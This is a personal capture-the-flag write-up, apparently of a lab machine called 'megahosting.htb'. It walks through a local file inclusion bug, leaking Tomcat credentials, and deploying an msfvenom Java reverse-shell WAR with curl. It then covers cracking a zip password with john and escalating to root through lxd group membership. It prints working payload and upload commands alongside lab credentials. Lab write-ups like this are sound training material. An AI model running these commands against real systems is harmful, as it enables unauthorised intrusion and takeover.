Main steps
1. Enumerate site to find LFI vulnerability in GET parameter
2. Enumerate `tomcat` directory tree to find `tomcat-users.xml` file path
3. Read `tomcat-users.xml` for `tomcat` credentials
4. Upload a reverse shell payload using `tomcat` for shell access
5. Exfiltrate and brute force the password for a backup zip file
6. Reuse credentials for user access
7. Enumerate user's groups for `lxd` membership
8. Privilege escalate with `lxd` for root access

Learning points
1. `Apache Tomcat` file paths and exploitation via `manager-script` role
2. Privilege escalation with the `lxd` group

`nmap`
![[Pasted image 20260319013224.png]]

Ports 22, 80, 8080 open.

Port 8080 shows the default `Apache Tomcat` page.
![[Pasted image 20260319013256.png]]

Port 80 shows a Mega Hosting VPS site, with a domain name `megahosting.htb` which I added to `/etc/hosts`.
![[Pasted image 20260319013422.png]]

Looked around on the site and found something interesting in the `NEWS` tab. The PHP page is pulling a file in a GET parameter in the URL, which if improperly sanitized may lead to LFI.
![[Pasted image 20260319013613.png]]

Tried using the standard `../` for LFI and was able to include the `/etc/passwd` file.
![[Pasted image 20260319013648.png]]

Found a user named `ash`.

The default `Tomcat` page at port 8080 states that the `Tomcat` users are defined at `/etc/tomcat9/tomcat-users.xml`.
![[Pasted image 20260319020113.png]]

Tried to include this file with the LFI above but was unable to.

Searching the `Tomcat` directory structure was a bit confusing, since manual installs and package installs create different directory structures. Most sites pointed to the file being at `/usr/share/tomcat9/tomcat-users.xml`, but this also returned nothing.

Eventually I managed to find a forum post stating that the file is saved at `/usr/share/tomcat9/etc/tomcat-users.xml`. I also found a file list for the Debian package for `tomcat9` with this path here https://packages.debian.org/bullseye/all/tomcat9/filelist.

Including this file showed nothing in the browser, but inspecting the source code revealed the contents of the XML file, including credentials to login the the `Tomcat` application.
![[Pasted image 20260319020710.png]]

` tomcat ` : ` $3cureP4s5w0rd123! `

The credentials did not work for the `/manager` login since the role was wrong, but I was able to get access to the `/host-manager/html` page, the virtual host manager.
![[Pasted image 20260319021012.png]]

From this page, it looks like this user is able to add a virtual host with the option to `UnpackWARS`. This could allow me to upload malicious code as a WAR file.

Some Googling gave me this article https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00 showing how to upload a WAR file using `curl` if the user has the `manager-script` role, which I do.

The request uploads a Java based reverse shell (generated with `msfvenom` using `msfvenom -p java/shell_reverse_tcp lhost=10.10.14.67 lport=4444 -f war -o shell.war`) to the `Tomcat` manager with ` curl -v -u tomcat:\$3cureP4s5w0rd123\! --upload-file shell.war "http://megahosting.htb:8080/manager/text/deploy?path=/foo&update=true" `. 

Uploaded the file successfully.
![[Pasted image 20260319021745.png]]

Sent a request to the directory where I uploaded the file, and got a reverse shell as `tomcat`.
![[Pasted image 20260319021837.png]]

Looking around the system: in `/var/www/html/files`, found a backup zip file that required a password. Listing the contents showed the same files in the `html` directory.
![[Pasted image 20260319022343.png]]

Since this file seemed interesting, I downloaded it by with `wget http://megahosting.htb/news.php?file=16162020_backup.zip`, used `zip2john` to convert it to a `john` hash file, and tried cracking the password with `john`.
![[Pasted image 20260319023535.png]]

The password was ` admin@it `.

There was nothing interesting in the zip folder, so I tried using this password on `ash` and was able to get access.
![[Pasted image 20260319023816.png]]

Copied my SSH key to `ash`'s home directory for a more stable shell.

Checked the user's `id` and found that the user is part of the `lxd` group. This group allows users within to access the `LXD` system container and VM manager, being able to create, start, stop, and delete containers or VMs without needing `sudo` access. Since `LXD` runs as root, the user can easily gain control over the host.

Found a script here https://github.com/initstring/lxd_root that automates the commands needed to privilege escalate. There is also a more detailed writeup here https://initblog.com/2019/lxd-root/. The shell script here mounts the host filesystem into a container, where the unprivileged user has root access (in the container). Since the container is mapped to the host, changes here will also affect the host, and I can overwrite whatever files I want to.

The exploit first requires a container to be created (or an existing container can be used). This can be checked with `lxc ls`.
![[Pasted image 20260319025447.png]]

No containers, so I need to initialize `LXD` with `lxd init`.
![[Pasted image 20260319025643.png]]

Then, create one using `lxc launch ubuntu:18.04 privesc`.
This did not work as there is no Internet connection, and `LXD` needs to download the image from the cloud.

Instead, I tried using `lxc init --empty privesc` to create an empty container.
![[Pasted image 20260319030113.png]]

This also did not work as the container cannot be started.

I downloaded a image builder for Alpine Linux from here https://github.com/saghul/lxd-alpine-builder and ran it to build an Alpine image, then transferred it to the server with `wget`, then imported the image into `LXD` with `lxc image import <file>`.
![[Pasted image 20260319031147.png]]

This successfully added a local Alpine Linux image into the server.
Added an alias to the image and created a new container.
![[Pasted image 20260319031349.png]]

Tried running the script again and successfully upgraded the user to root.
![[Pasted image 20260319031516.png]]

Another cleaner way to privilege escalate with `LXD` in a network restricted environment can be found here: https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1